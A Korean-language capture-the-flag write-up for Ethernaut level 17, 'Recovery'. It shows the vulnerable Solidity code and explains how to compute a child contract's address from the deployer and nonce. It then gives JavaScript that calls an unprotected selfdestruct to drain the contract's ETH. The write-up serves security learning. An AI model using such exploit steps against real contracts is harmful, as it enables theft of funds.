# Ethernaut Level 17 - Recovery

## 문제 설명

`Recovery` 컨트랙트가 생성한 자식 컨트랙트 주소를 찾아 잠긴 ETH를 회수하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract Recovery {
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    mapping(address => uint) balances;

    constructor(string memory _name, address _creator, uint256 _initialSupply) public {
        balances[_creator] = _initialSupply;
    }

    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```

---

## 취약점 분석

### 컨트랙트 주소는 결정론적으로 계산됨

이더리움에서 컨트랙트 주소는 다음과 같이 계산된다:

```
주소 = keccak256(RLP(배포자주소, nonce))[마지막 20바이트]
```

Recovery 컨트랙트가 처음 배포한 컨트랙트이므로 nonce = 1

→ 주소 예측 가능 → 분실된 컨트랙트 주소 복구 가능

---

## 공격 단계

### 방법 1 — Etherscan으로 주소 찾기 (가장 쉬움)

1. Etherscan에서 Recovery 인스턴스 주소 검색
2. **Internal Transactions** 탭 클릭
3. 생성된 자식 컨트랙트 주소 확인

### 방법 2 — 직접 계산

```js
// RLP 인코딩으로 주소 계산
const recoveryAddr = contract.address
const nonce = 1

// keccak256(0xd6, 0x94, recoveryAddr, 0x01) 형태
const hash = web3.utils.soliditySha3(
    {t: 'bytes1', v: '0xd6'},
    {t: 'bytes1', v: '0x94'},
    {t: 'address', v: recoveryAddr},
    {t: 'bytes1', v: '0x01'}
)
const tokenAddress = "0x" + hash.slice(-40)
```

### Step 2 — destroy 호출로 ETH 회수

```js
// SimpleToken ABI로 destroy 직접 호출
const abi = [{"inputs":[{"name":"_to","type":"address"}],"name":"destroy","outputs":[],"type":"function"}]
const token = new web3.eth.Contract(abi, tokenAddress)
await token.methods.destroy(player).send({from: player})
```

---

## 핵심 교훈

- 컨트랙트 주소는 예측 가능하다
- 배포된 모든 컨트랙트 주소는 블록체인에서 추적 가능
- 컨트랙트 주소에 ETH를 보내기 전 항상 검증 필요
- `CREATE2`를 사용하면 더 결정론적으로 주소 예측 가능
